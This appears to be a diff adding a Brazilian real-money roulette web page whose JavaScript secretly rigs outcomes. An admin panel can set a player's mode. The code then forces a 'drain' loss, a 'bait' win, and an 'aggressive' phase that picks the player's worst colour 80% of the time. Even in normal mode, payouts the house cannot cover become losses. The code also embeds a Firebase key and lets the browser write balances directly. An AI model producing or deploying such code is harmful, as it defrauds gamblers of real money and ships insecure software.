@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SorteCerta - Roleta Turbo</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --bg-main: #050505;
+            --bg-card: #121214;
+            --gold: #f1c40f;
+            --gold-dark: #b8860b;
+            --red: #e74c3c;
+            --black: #1a1a1a;
+            --green: #2ecc71;
+            --text-main: #f4f4f5;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; user-select: none; touch-action: manipulation; }
+
+        body { background-color: var(--bg-main); color: var(--text-main); display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-y: auto; }
+
+        /* HEADER */
+        .header { width: 100%; background: rgba(18, 18, 20, 0.95); border-bottom: 1px solid #27272a; display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; }
+        .btn-back { color: #8b8b93; text-decoration: none; font-size: 18px; }
+        .logo-roulette { font-weight: 900; color: var(--gold); letter-spacing: 1px; font-size: 20px; text-transform: uppercase; }
+        .balance-badge { background: rgba(0, 230, 118, 0.1); color: var(--green); padding: 5px 12px; border-radius: 20px; font-weight: 900; font-size: 13px; border: 1px solid var(--green); cursor: pointer; }
+
+        .game-container { width: 100%; max-width: 450px; padding: 15px; display: flex; flex-direction: column; gap: 15px; }
+
+        /* ROLETA VISUAL */
+        .roulette-arena { background: #0a0a0c; border: 2px solid #27272a; border-radius: 16px; padding: 20px; display: flex; flex-direction: column; align-items: center; box-shadow: inset 0 0 30px rgba(0,0,0,0.8); position: relative; overflow: hidden; }
+        
+        .wheel-container { position: relative; width: 220px; height: 220px; display: flex; justify-content: center; align-items: center; }
+        
+        .wheel { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #333; background: conic-gradient( var(--green) 0deg 10deg, var(--red) 10deg 190deg, var(--black) 190deg 360deg ); box-shadow: 0 10px 30px rgba(0,0,0,0.8), inset 0 0 20px rgba(0,0,0,0.5); transition: transform 3s cubic-bezier(0.25, 1, 0.5, 1); position: relative; }
+        
+        /* Centro da roleta */
+        .wheel::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 40px; height: 40px; background: linear-gradient(145deg, #f1c40f, #b8860b); border-radius: 50%; border: 3px solid #000; z-index: 5; }
+        
+        /* Marcador (Onde a bolinha cai) */
+        .marker { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 25px solid #fff; z-index: 10; filter: drop-shadow(0 4px 4px rgba(0,0,0,0.5)); }
+
+        .result-display { margin-top: 20px; font-size: 24px; font-weight: 900; background: #000; padding: 10px 30px; border-radius: 12px; border: 2px solid #333; opacity: 1; transition: 0.3s; }
+
+        /* MESA DE APOSTAS */
+        .bet-table { display: flex; gap: 10px; width: 100%; margin-top: 10px; }
+        .bet-zone { flex: 1; height: 80px; border-radius: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; cursor: pointer; position: relative; border: 2px solid transparent; transition: 0.2s; box-shadow: 0 4px 0 rgba(0,0,0,0.3); }
+        .bet-zone:active { transform: translateY(4px); box-shadow: 0 0 0 rgba(0,0,0,0.3); }
+        .bet-zone.red { background: var(--red); color: #fff; }
+        .bet-zone.green { background: var(--green); color: #000; flex: 0.6; }
+        .bet-zone.black { background: #222; color: #fff; border-color: #444; }
+        
+        .multiplier { font-size: 10px; opacity: 0.8; margin-top: 5px; }
+        .chip-stack { position: absolute; top: 5px; right: 5px; background: #fff; color: #000; font-size: 10px; font-weight: 900; padding: 2px 6px; border-radius: 10px; border: 2px solid var(--gold); display: none; }
+
+        /* CONTROLES DE FICHAS */
+        .controls { background: var(--bg-card); border: 1px solid #27272a; border-radius: 16px; padding: 15px; display: flex; flex-direction: column; gap: 15px; }
+        
+        .chips-container { display: flex; justify-content: space-between; background: #000; padding: 10px; border-radius: 12px; border: 1px solid #333; }
+        .chip-btn { width: 45px; height: 45px; border-radius: 50%; border: 2px dashed #666; background: #222; color: #fff; font-weight: 900; font-size: 12px; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; }
+        .chip-btn.active { border: 2px solid var(--gold); background: radial-gradient(circle, #f1c40f, #b8860b); color: #000; transform: scale(1.1); box-shadow: 0 0 10px rgba(241, 196, 15, 0.5); }
+
+        .action-row { display: flex; gap: 10px; }
+        .btn-clear { background: #333; border: none; color: #fff; padding: 10px; border-radius: 10px; font-weight: bold; width: 30%; cursor: pointer; }
+        
+        .btn-spin { flex: 1; background: linear-gradient(180deg, var(--gold) 0%, var(--gold-dark) 100%); border: none; color: #000; font-size: 20px; font-weight: 900; border-radius: 10px; cursor: pointer; box-shadow: 0 6px 0 #8a6508; text-transform: uppercase; transition: 0.1s; }
+        .btn-spin:active:not(:disabled) { transform: translateY(6px); box-shadow: 0 0 0 #8a6508; }
+        .btn-spin:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        /* OVERLAY MENSAGEM */
+        .game-message { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.95); border: 2px solid var(--gold); color: var(--gold); padding: 15px 30px; border-radius: 12px; font-weight: 900; font-size: 22px; z-index: 20; display: none; text-align: center; box-shadow: 0 10px 30px rgba(241,196,15,0.3); width: 80%; }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="index.html" class="btn-back"><i class="fa-solid fa-arrow-left"></i></a>
+        <div class="logo-roulette"><i class="fa-solid fa-dharmachakra"></i> Turbo</div>
+        <div class="balance-badge" onclick="window.location.href='saldo.html'" id="displaySaldoTop">R$ 0,00</div>
+    </header>
+
+    <div class="game-container">
+        
+        <div class="roulette-arena">
+            <div class="wheel-container">
+                <div class="marker"></div>
+                <div class="wheel" id="wheel"></div>
+            </div>
+            <div class="result-display" id="resultDisplay">Aposte!</div>
+            <div class="game-message" id="gameMessage"></div>
+        </div>
+
+        <div class="bet-table">
+            <div class="bet-zone red" onclick="placeBet('red')">
+                VERMELHO
+                <span class="multiplier">2x</span>
+                <div class="chip-stack" id="stack-red">R$ 0</div>
+            </div>
+            <div class="bet-zone green" onclick="placeBet('green')">
+                <i class="fa-solid fa-leaf"></i> ZERO
+                <span class="multiplier">14x</span>
+                <div class="chip-stack" id="stack-green">R$ 0</div>
+            </div>
+            <div class="bet-zone black" onclick="placeBet('black')">
+                PRETO
+                <span class="multiplier">2x</span>
+                <div class="chip-stack" id="stack-black">R$ 0</div>
+            </div>
+        </div>
+
+        <div class="controls">
+            <p style="font-size: 12px; color: #888; text-align: center; font-weight: bold; text-transform: uppercase;">Selecione a Ficha</p>
+            <div class="chips-container">
+                <div class="chip-btn active" onclick="selectChip(1, this)">R$ 1</div>
+                <div class="chip-btn" onclick="selectChip(5, this)">R$ 5</div>
+                <div class="chip-btn" onclick="selectChip(10, this)">R$ 10</div>
+                <div class="chip-btn" onclick="selectChip(50, this)">R$ 50</div>
+                <div class="chip-btn" onclick="selectChip(100, this)">R$ 100</div>
+            </div>
+
+            <div class="action-row">
+                <button class="btn-clear" onclick="clearBets()"><i class="fa-solid fa-trash"></i></button>
+                <button class="btn-spin" id="btnSpin" onclick="spinRoulette()">GIRAR</button>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // FIREBASE CONFIGURAÇÃO (Blindada)
+        const firebaseConfig = {
+            apiKey: "AIzaSyBOP7TfHjA2jjwJvWab72Zk0jfw5U9oHio",
+            databaseURL: "https://sortecerta-75b77-default-rtdb.firebaseio.com",
+            projectId: "sortecerta-75b77"
+        };
+        const db = getDatabase(initializeApp(firebaseConfig));
+
+        let idDispositivo = localStorage.getItem('usuario_tracker_id') || 'TIGER-' + Math.floor(100000 + Math.random() * 900000);
+        localStorage.setItem('usuario_tracker_id', idDispositivo);
+
+        let bancaAtual = 0.00;
+        let caixaDaCasa = 0.00;
+        let margemLucro = 0.30;
+        let modoJogo = "normal";
+        let estadoSequencia = 0;
+        let valorPremioForcado = 0;
+
+        let selectedChip = 1;
+        let bets = { red: 0, green: 0, black: 0 };
+        let isSpinning = false;
+        let currentRotation = 0;
+
+        const ctxAudio = new (window.AudioContext || window.webkitAudioContext)();
+
+        // SINCRONIZAÇÃO COM O ADMIN PANEL
+        onValue(ref(db, 'usuarios/' + idDispositivo), (snapshot) => {
+            const dados = snapshot.val();
+            if (dados) {
+                if (!isSpinning) bancaAtual = parseFloat(dados.saldo || 0);
+                if (estadoSequencia !== 3) modoJogo = String(dados.modo || "normal").toLowerCase();
+                
+                let iscaLida = parseFloat(String(dados.forcarGanho || "0").replace(/[^\d.,]/g, '').replace(',', '.')) || 0;
+                if (iscaLida > 0 && estadoSequencia === 0) {
+                    valorPremioForcado = iscaLida;
+                    estadoSequencia = 1;
+                    set(ref(db, 'usuarios/' + idDispositivo + '/forcarGanho'), 0);
+                }
+            }
+            updateBalanceUI();
+        });
+
+        onValue(ref(db, 'sistema/caixa_global'), (snapshot) => {
+            caixaDaCasa = parseFloat(snapshot.val() || 0);
+        });
+
+        function updateBalanceUI() {
+            document.getElementById('displaySaldoTop').innerText = "R$ " + bancaAtual.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+        }
+
+        // GERENCIAMENTO DE APOSTAS
+        window.selectChip = function(value, element) {
+            if(isSpinning) return;
+            selectedChip = value;
+            document.querySelectorAll('.chip-btn').forEach(btn => btn.classList.remove('active'));
+            element.classList.add('active');
+            tocarSomClick();
+        }
+
+        window.placeBet = function(color) {
+            if(isSpinning) return;
+            if (bancaAtual < selectedChip) {
+                alert("Saldo Insuficiente!");
+                return;
+            }
+            
+            // Subtrai do jogador TEMPORARIAMENTE para a UI
+            bancaAtual -= selectedChip;
+            bets[color] += selectedChip;
+            
+            updateBalanceUI();
+            updateBetTable();
+            tocarSomClick();
+        }
+
+        window.clearBets = function() {
+            if(isSpinning) return;
+            let totalBetted = bets.red + bets.green + bets.black;
+            if(totalBetted === 0) return;
+
+            bancaAtual += totalBetted; // Devolve pra banca
+            bets = { red: 0, green: 0, black: 0 };
+            
+            updateBalanceUI();
+            updateBetTable();
+        }
+
+        function updateBetTable() {
+            ['red', 'green', 'black'].forEach(color => {
+                const stack = document.getElementById(`stack-${color}`);
+                if(bets[color] > 0) {
+                    stack.style.display = 'block';
+                    stack.innerText = "R$ " + bets[color];
+                } else {
+                    stack.style.display = 'none';
+                }
+            });
+        }
+
+        // MOTOR DA ROLETA (ONDE A MÁGICA ACONTECE)
+        window.spinRoulette = function() {
+            let totalBet = bets.red + bets.green + bets.black;
+            if (totalBet === 0) { alert("Faça pelo menos uma aposta!"); return; }
+            if (isSpinning) return;
+
+            if (ctxAudio.state === 'suspended') ctxAudio.resume();
+            isSpinning = true;
+            document.getElementById('btnSpin').disabled = true;
+            document.getElementById('resultDisplay').innerText = "Girando...";
+            document.getElementById('gameMessage').style.display = 'none';
+
+            // 1. DEDUÇÃO REAL DO FIREBASE E ALIMENTAÇÃO DO COFRE
+            set(ref(db, 'usuarios/' + idDispositivo + '/saldo'), parseFloat(bancaAtual.toFixed(2)));
+            set(ref(db, 'sistema/caixa_global'), parseFloat((caixaDaCasa + totalBet).toFixed(2)));
+
+            // 2. CÉREBRO DA MATEMÁTICA E RTP (O GRANDE SEGREDO)
+            let resultColor = determineRiggedOutcome();
+            
+            // 3. ANIMAÇÃO DA ROLETA
+            let stopAngle = calculateStopAngle(resultColor);
+            
+            // Gira várias vezes antes de parar
+            currentRotation += 1440 + stopAngle; 
+            
+            const wheel = document.getElementById('wheel');
+            wheel.style.transform = `rotate(${currentRotation}deg)`;
+            tocarSomRoleta();
+
+            // 4. PROCESSAR RESULTADO APÓS ANIMAÇÃO
+            setTimeout(() => {
+                processPayout(resultColor);
+            }, 3200);
+        }
+
+        function determineRiggedOutcome() {
+            // Calcula quanto cada cor pagaria se caísse
+            let payoutRed = bets.red * 2;
+            let payoutBlack = bets.black * 2;
+            let payoutGreen = bets.green * 14;
+
+            // FASE 1: DRENAGEM (Isca armada, mas precisa perder primeiro)
+            if (estadoSequencia === 1) {
+                estadoSequencia = 2; // Avança pra isca na próxima
+                return getWorstOutcome(payoutRed, payoutBlack, payoutGreen);
+            }
+
+            // FASE 2: ISCA (Forçar Ganho)
+            if (estadoSequencia === 2 && valorPremioForcado > 0) {
+                estadoSequencia = 3;
+                set(ref(db, 'usuarios/' + idDispositivo + '/modo'), 'agressivo');
+                
+                // Tenta achar a cor que paga um valor próximo ao forçado, ou simplesmente faz ele ganhar.
+                if (payoutGreen > 0) return 'green';
+                if (payoutRed > payoutBlack) return 'red';
+                return 'black';
+            }
+
+            // FASE 3: AGRESSIVO (Perda quase garantida)
+            if (modoJogo === 'agressivo' || estadoSequencia === 3) {
+                // 80% de chance de forçar a pior cor
+                if(Math.random() < 0.8) return getWorstOutcome(payoutRed, payoutBlack, payoutGreen);
+            }
+
+            // MODO NORMAL (AUDITORIA DO RTP)
+            let availableFunds = caixaDaCasa * (1 - margemLucro);
+            let colors = ['red', 'black', 'green'];
+            
+            // Sorteia uma cor natural (Verde tem 5% de chance na roleta europeia, Red/Black ~47.5%)
+            let naturalRoll = Math.random();
+            let chosenColor = 'red';
+            if (naturalRoll > 0.475 && naturalRoll <= 0.95) chosenColor = 'black';
+            else if (naturalRoll > 0.95) chosenColor = 'green';
+
+            let payoutForChosen = chosenColor === 'red' ? payoutRed : (chosenColor === 'black' ? payoutBlack : payoutGreen);
+
+            // A CASA TEM DINHEIRO PRA PAGAR?
+            if (payoutForChosen > availableFunds || (modoJogo === 'desfarcado' && payoutForChosen > (totalBet * 3))) {
+                // NÃO TEM DINHEIRO! FORÇA A PIOR COR PARA A CASA NÃO QUEBRAR
+                return getWorstOutcome(payoutRed, payoutBlack, payoutGreen);
+            }
+
+            // Tem dinheiro, deixa a sorte agir.
+            return chosenColor;
+        }
+
+        // Função auxiliar que encontra a cor que o jogador apostou menos (ou zero)
+        function getWorstOutcome(pR, pB, pG) {
+            if (pR === 0 && pB === 0) return Math.random() > 0.5 ? 'red' : 'black'; // Ele apostou só no verde
+            if (pR === 0) return 'red';
+            if (pB === 0) return 'black';
+            if (pG === 0) return 'green'; // Se apostou nos dois, cai no verde (a casa limpa tudo)
+            
+            // Se ele apostou em todas as 3 casas (burrice), cai na que paga menos
+            if (pR <= pB && pR <= pG) return 'red';
+            if (pB <= pR && pB <= pG) return 'black';
+            return 'green';
+        }
+
+        // Transforma a cor em ângulos para o CSS da roleta
+        function calculateStopAngle(color) {
+            // Verde: 0 a 10 graus. Red: 10 a 190. Black: 190 a 360.
+            // Para parar exatamente, subtraímos de 360 porque a rotação é no sentido horário
+            if (color === 'green') return 360 - (Math.random() * 8 + 1); 
+            if (color === 'red') return 360 - (Math.random() * 160 + 20); 
+            if (color === 'black') return 360 - (Math.random() * 150 + 200);
+        }
+
+        function processPayout(winningColor) {
+            let winAmount = 0;
+            if (winningColor === 'red') winAmount = bets.red * 2;
+            if (winningColor === 'black') winAmount = bets.black * 2;
+            if (winningColor === 'green') winAmount = bets.green * 14;
+
+            const display = document.getElementById('resultDisplay');
+            const msg = document.getElementById('gameMessage');
+
+            let corNome = winningColor === 'red' ? 'VERMELHO' : (winningColor === 'black' ? 'PRETO' : 'VERDE ZERO');
+            display.innerText = corNome;
+            display.style.color = `var(--${winningColor})`;
+
+            if (winAmount > 0) {
+                // PAGA O JOGADOR E DESCONTA DO COFRE
+                bancaAtual += winAmount;
+                set(ref(db, 'usuarios/' + idDispositivo + '/saldo'), parseFloat(bancaAtual.toFixed(2)));
+                
+                let novoCofre = Math.max(0, caixaDaCasa - winAmount);
+                set(ref(db, 'sistema/caixa_global'), parseFloat(novoCofre.toFixed(2)));
+
+                tocarSomWin();
+                msg.innerHTML = `LUCRO!<br><span style="color:#fff;">R$ ${winAmount.toFixed(2)}</span>`;
+                msg.style.borderColor = 'var(--green)';
+                msg.style.color = 'var(--green)';
+            } else {
+                msg.innerHTML = `PERDEU!<br><span style="color:#fff; font-size:14px;">Tente novamente</span>`;
+                msg.style.borderColor = 'var(--red)';
+                msg.style.color = 'var(--red)';
+            }
+
+            msg.style.display = 'block';
+            updateBalanceUI();
+
+            // Zera a mesa para a próxima rodada
+            bets = { red: 0, green: 0, black: 0 };
+            updateBetTable();
+
+            setTimeout(() => {
+                msg.style.display = 'none';
+                display.innerText = "Aposte!";
+                display.style.color = "#fff";
+                document.getElementById('btnSpin').disabled = false;
+                isSpinning = false;
+            }, 2500);
+        }
+
+        // SONS RÁPIDOS
+        function tocarSomClick() { try { let o = ctxAudio.createOscillator(), g = ctxAudio.createGain(); o.type = 'triangle'; o.frequency.setValueAtTime(800, ctxAudio.currentTime); g.gain.setValueAtTime(0.1, ctxAudio.currentTime); o.connect(g); g.connect(ctxAudio.destination); o.start(); o.stop(ctxAudio.currentTime + 0.1); } catch(e){} }
+        function tocarSomRoleta() { try { let o = ctxAudio.createOscillator(), g = ctxAudio.createGain(); o.type = 'sine'; o.frequency.setValueAtTime(100, ctxAudio.currentTime); o.frequency.exponentialRampToValueAtTime(10, ctxAudio.currentTime + 3); g.gain.setValueAtTime(0.1, ctxAudio.currentTime); g.gain.exponentialRampToValueAtTime(0.01, ctxAudio.currentTime + 3); o.connect(g); g.connect(ctxAudio.destination); o.start(); o.stop(ctxAudio.currentTime + 3); } catch(e){} }
+        function tocarSomWin() { try { let o = ctxAudio.createOscillator(), g = ctxAudio.createGain(); o.type = 'square'; o.frequency.setValueAtTime(400, ctxAudio.currentTime); o.frequency.setValueAtTime(600, ctxAudio.currentTime + 0.1); o.frequency.setValueAtTime(800, ctxAudio.currentTime + 0.2); g.gain.setValueAtTime(0.1, ctxAudio.currentTime); o.connect(g); g.connect(ctxAudio.destination); o.start(); o.stop(ctxAudio.currentTime + 0.5); } catch(e){} }
+    </script>
+</body>
+</html>
